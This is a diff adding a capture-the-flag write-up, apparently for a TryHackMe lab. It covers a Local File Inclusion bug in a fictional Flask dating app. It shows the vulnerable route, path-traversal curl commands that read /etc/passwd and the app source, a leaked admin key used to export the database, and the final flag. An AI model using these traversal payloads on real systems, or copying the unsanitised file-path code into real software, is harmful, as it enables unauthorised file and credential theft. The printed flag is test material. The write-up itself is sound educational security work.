@@ -1,0 +1,122 @@
+# 💖 Valenfind Challenge – “Vibe-Coded Dating App”
+
+## 📝 Challenge Overview
+
+**Valenfind** is a fictional dating application with a hidden vulnerability.  
+Your goal is to find the **flag** hidden within the system.  
+
+The app was accessible at:  
+
+http://10.49.158.106:5000
+
+
+---
+
+## 🔍 Understanding the Vulnerability
+
+### 1. What is LFI (Local File Inclusion)?
+
+**Local File Inclusion (LFI)** is a web security vulnerability that allows an attacker to include files on a server through the web browser.  
+It usually happens when a web application **uses user input to dynamically load files** without proper validation.  
+
+**Why LFI is dangerous:**
+- Attackers can read sensitive files such as `/etc/passwd` or configuration files.
+- It may expose source code or secrets (like API keys or passwords).
+- Can lead to full system compromise if combined with other vulnerabilities.
+
+**Example in this app:**
+
+```python
+@app.route('/api/fetch_layout')
+def fetch_layout():
+    layout_file = request.args.get('layout', 'theme_classic.html')
+    file_path = os.path.join(os.getcwd(), 'templates', 'components', layout_file)
+    with open(file_path, 'r') as f:
+        return f.read()
+Here, the layout parameter is directly used to access files.
+No proper sanitization → any file on the system can be read.
+
+2. Python Server Vulnerability
+The Flask server had multiple issues:
+
+Hardcoded secrets:
+
+ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
+Hardcoding API keys is dangerous because once discovered, attackers can access privileged endpoints.
+
+Unrestricted file read via LFI:
+The fetch_layout route allowed reading sensitive files outside the intended templates folder.
+
+Database exposure endpoint:
+
+@app.route('/api/admin/export_db')
+With the admin key, anyone could download the full SQLite database containing user credentials and the flag.
+
+🛠 Step-by-Step Solution
+Step 1: Test for LFI
+Try fetching a system file:
+
+curl "http://10.49.158.106:5000/api/fetch_layout?layout=../../../../etc/passwd"
+✅ You should see contents like:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin/nologin
+...
+This confirms LFI vulnerability.
+
+Step 2: Fetch Application Source Code
+curl "http://10.49.158.106:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
+From the code, you can find:
+
+ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
+
+Database path: cupid.db
+
+/api/admin/export_db endpoint for downloading the database.
+
+Step 3: Export the Database
+Use the admin key to download the database:
+
+curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
+"http://10.49.158.106:5000/api/admin/export_db" -o valenfind.db
+Step 4: Inspect the Database
+Open the database using SQLite:
+
+sqlite3 valenfind.db
+Check tables:
+
+.tables
+Query users:
+
+select * from users;
+Step 5: Locate the Flag
+The flag is stored in the address field of the admin user (cupid):
+
+FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
+✅ That’s the final flag.
+
+⚡ Lessons Learned
+Never trust user input – sanitize any file paths to prevent LFI.
+
+Do not hardcode secrets – store them securely outside source code.
+
+Secure admin endpoints – always require authentication and limit access.
+
+Database safety – never expose databases to the public directly.
+
+Audit code for dynamic file access – any dynamic open() or template load can be exploited.
+
+🏁 Conclusion
+This challenge demonstrates:
+
+The power of Local File Inclusion (LFI).
+
+The dangers of exposing admin API keys.
+
+How sensitive information can be leaked through poor server design.
+
+Flag:
+
+THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
+
+---
